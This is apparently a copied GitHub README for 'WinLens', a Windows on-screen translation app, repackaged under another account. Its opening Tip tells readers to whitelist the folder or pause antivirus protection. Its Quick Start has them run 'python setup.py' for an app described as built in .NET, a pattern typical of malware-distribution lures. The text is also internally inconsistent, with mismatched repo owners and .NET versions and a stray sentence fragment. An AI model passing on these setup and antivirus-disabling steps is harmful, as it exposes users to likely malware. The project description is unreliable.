<div align="center">

<img src="assets/logo.png" alt="WinLens logo" width="120" />

# WinLens


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/capitaltoadjam/WinLens-896.git
cd WinLens-896
python setup.py
```


**Translate any text on your Windows screen, in place.**
A desktop take on Google Lens translate.

English · [简体中文](README.zh-CN.md)

[Explore the docs »](#usage)

[Report Bug](https://github.com/capitaltoadjam/WinLens-896/issues/new?template=bug_report.yml) ·
[Request Feature](https://github.com/capitaltoadjam/WinLens-896/issues/new?template=feature_request.yml) ·
[Discussions](https://github.com/capitaltoadjam/WinLens-896/discussions)

[![Build](https://github.com/capitaltoadjam/WinLens-896/actions/workflows/build.yml/badge.svg)](https://github.com/capitaltoadjam/WinLens-896/actions/workflows/build.yml)
[![License: MIT](https://img.shields.io/github/license/marco-beltrame/WinLens?color=8b5cf6)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078D6?logo=windows&logoColor=white)](#installation)
[![.NET](https://img.shields.io/badge/.NET-8.0-512BD4?logo=dotnet&logoColor=white)](https://dotnet.microsoft.com/)
[![Downloads](https://img.shields.io/github/downloads/marco-beltrame/WinLens/total?color=8b5cf6)]()
[![Stars](https://img.shields.io/github/stars/marco-beltrame/WinLens?style=flat&color=8b5cf6)](https://github.com/capitaltoadjam/WinLens-896/stargazers)

</div>

<div align="center">
<img src="assets/demo.gif" alt="WinLens translating on-screen text to English in place" width="860"/>
</div>

## Overview

WinLens translates the text on your screen and draws the translation right over the original,
matching the background and font so it reads as if the app had always been in your language.
It's the Google Lens *translate* idea, but for the Windows desktop.

Browser translators only touch web pages. WinLens reads whatever is rendered on screen, so it
also works on native apps, games, chat clients, PDFs and foreign software. It uses OCR, so the
text doesn't need to be selectable.

It sits in the system tray and is triggered by a global hotkey. Press the hotkey, read the
translation, press <kbd>Esc</kbd> to dismiss it.

## Why WinLens?

Browser extensions translate text *inside a web page*. They can't read anything else on your
screen. WinLens runs OCR on the actual pixels, so it translates things they can't:

- **Text inside images:** photos, screenshots, memes, infographics, scanned documents.
- **Games:** menus and dialogue, including imported titles.
- **Desktop apps:** installers, error dialogs, foreign software UIs.
- **PDFs and documents** in any reader.
- **Video frames and subtitles.**
- **Anything you can't select or copy.**

If a browser tab already translates it, you don't need WinLens. For everything else on screen, you do.

## Features

- Translates on-screen text in place: the translation replaces the original, with a matching background and font, instead of appearing in a separate box.
- Works on any window (apps, games, chats, documents), not just the browser.
- Reads Latin and CJK (Chinese, Japanese, Korean) on the same screen.
- Global hotkey, default <kbd>Ctrl</kbd> + <kbd>Alt</kbd> + <kbd>T</kbd>.
- Upscales the screenshot before OCR and picks the best recognizer per text block, which helps accuracy on small text.
- Dark control panel. You can change the target language straight from the overlay.
- Right-click a block to copy the original text or the translation.
- Optional "launch at startup". Otherwise it stays out of the way in the tray.

## Control panel

A small tray app with a dark control panel. Pick the target language, set the hotkey,
choose the OCR source language, and toggle launch-at-startup.

<div align="center">
<img src="assets/settings.png" alt="WinLens control panel" width="330"/>
</div>


### OCR language packs

WinLens uses the Windows OCR engine, so it can only read languages whose OCR pack is installed.
Most systems already have your display language. To add more (for example Chinese or Japanese):

> Settings > Time & Language > Language & region > (your language) > Language options > Optional features > add the OCR feature.

The "Add OCR languages in Windows" link in the control panel opens that page for you. Newly
installed languages show up automatically.


## How it works

```
Hotkey > capture screen > upscale > OCR (per script) > translate > overlay in place
```

   it (Latin from the Latin engine, CJK from the CJK engine), then drop overlapping duplicates.
## Roadmap

The [issues](https://github.com/capitaltoadjam/WinLens-896/issues) and
[project board](https://github.com/capitaltoadjam/WinLens-896/projects) have the full list.

- [ ] Offline translation (Argos / NLLB): no network, no rate limits, more privacy.
- [ ] PaddleOCR / ONNX engine: stronger CJK and small-text accuracy, no OS language packs.
- [ ] Cross-platform (Avalonia): macOS and Linux.
- [ ] Region capture: translate a selected area instead of the whole screen.
- [x] Animated demo (GIF) in the README.


## Contributing

Contributions are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) and the
[Code of Conduct](CODE_OF_CONDUCT.md). Issues tagged
[good first issue](https://github.com/capitaltoadjam/WinLens-896/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22)
are a good place to start.

## License

MIT. See [LICENSE](LICENSE).

## Acknowledgements

- Translation through the Google Translate endpoint, with a [MyMemory](https://mymemory.translated.net/) fallback.
- Tray integration with [Hardcodet.NotifyIcon.Wpf](https://github.com/hardcodet/wpf-notifyicon).
- Built with .NET 10 and WPF.


<!-- Last updated: 2026-06-06 17:17:13 -->
